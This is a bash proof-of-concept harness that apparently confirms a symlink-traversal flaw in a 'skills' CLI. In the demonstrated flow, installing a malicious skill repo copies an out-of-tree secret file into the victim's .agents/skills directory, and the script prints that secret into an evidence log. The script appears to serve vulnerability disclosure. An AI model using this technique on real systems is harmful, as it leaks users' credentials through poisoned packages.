#!/usr/bin/env bash
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="${REPO_ROOT:-$(cd "$SCRIPT_DIR/../../.." && pwd)}"
EVIDENCE_DIR="${EVIDENCE_DIR:-$SCRIPT_DIR/evidence}"
SETUP_SH="$EVIDENCE_DIR/setup.sh"
EXPLOIT_SH="$EVIDENCE_DIR/exploit.sh"
mkdir -p "$EVIDENCE_DIR"

json_result() {
  local status="$1" evidence="$2" notes="${3:-}"
  printf '{"status": "%s", "evidence": "%s", "notes": "%s"}\n' "$status" "$evidence" "$notes"
}

sha256_file() {
  if command -v shasum >/dev/null 2>&1; then
    shasum -a 256 "$1" | awk '{print $1}'
  elif command -v sha256sum >/dev/null 2>&1; then
    sha256sum "$1" | awk '{print $1}'
  else
    cksum "$1" | awk '{print $1}'
  fi
}

if [[ ! -f "$REPO_ROOT/src/cli.ts" ]]; then
  json_result "failed" "target CLI source not found" "set REPO_ROOT to the skills repository"
  exit 0
fi

export REPO_ROOT EVIDENCE_DIR

{
  echo "timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
  echo "repo_root: $REPO_ROOT"
  echo "script_dir: $SCRIPT_DIR"
  echo "os: $(uname -a)"
  echo "node: $(node --version 2>/dev/null || echo missing)"
  echo "pnpm: $(pnpm --version 2>/dev/null || echo missing)"
  echo "git: $(git --version 2>/dev/null || echo missing)"
} > "$EVIDENCE_DIR/env-info.txt" 2>&1

printf '[*] provisioning realistic CLI environment and malicious skill repo\n'
if ! bash "$SETUP_SH" > "$EVIDENCE_DIR/setup.log" 2>&1; then
  printf '[!] setup failed; see evidence/setup.log\n'
  json_result "failed" "setup failed before exploit" "see evidence/setup.log"
  exit 0
fi

# shellcheck source=/dev/null
source "$EVIDENCE_DIR/run.env"

{
  echo "CLI version:"
  cd "$REPO_ROOT"
  node bin/cli.mjs --version
  echo
  echo "Malicious repository symlink committed as:"
  cd "$MALICIOUS_REPO"
  git ls-files -s exfiltrated-token.txt || true
  echo
  echo "Symlink points outside skill tree:"
  ls -l "$MALICIOUS_REPO/exfiltrated-token.txt"
  echo "secret_file=$SECRET_FILE"
  echo "victim_project=$VICTIM_PROJECT"
} > "$EVIDENCE_DIR/healthcheck.log" 2>&1

printf '[*] running exploit through skills CLI add command\n'
if ! bash "$EXPLOIT_SH" > "$EVIDENCE_DIR/exploit.log" 2>&1; then
  printf '[!] exploit command failed; see evidence/exploit.log\n'
  json_result "failed" "CLI install command failed" "see evidence/exploit.log"
  exit 0
fi

INSTALLED_FILE="$VICTIM_PROJECT/.agents/skills/symlink-leak-demo/exfiltrated-token.txt"
{
  echo "Expected installed copy: $INSTALLED_FILE"
  echo
  echo "Source secret metadata:"
  ls -l "$SECRET_FILE"
  echo "sha256: $(sha256_file "$SECRET_FILE")"
  echo
  echo "Installed artifact metadata:"
  ls -l "$INSTALLED_FILE" || true
  if [[ -L "$INSTALLED_FILE" ]]; then
    echo "installed_artifact_type=symlink"
    readlink "$INSTALLED_FILE" || true
  elif [[ -f "$INSTALLED_FILE" ]]; then
    echo "installed_artifact_type=regular_file"
  else
    echo "installed_artifact_type=missing"
  fi
  if [[ -f "$INSTALLED_FILE" ]]; then
    echo "sha256: $(sha256_file "$INSTALLED_FILE")"
    echo
    echo "Installed artifact contents:"
    cat "$INSTALLED_FILE"
  fi
} > "$EVIDENCE_DIR/impact.log" 2>&1

if [[ -f "$INSTALLED_FILE" && ! -L "$INSTALLED_FILE" ]] && cmp -s "$SECRET_FILE" "$INSTALLED_FILE"; then
  printf '[+] confirmed: external secret was copied into .agents/skills as a regular file\n'
  json_result "confirmed" "out-of-tree secret materialized as regular installed skill file" "see evidence/impact.log"
else
  printf '[!] not confirmed: installed artifact missing, still a symlink, or content mismatch\n'
  json_result "failed" "installed skill did not contain copied external secret" "see evidence/impact.log"
fi
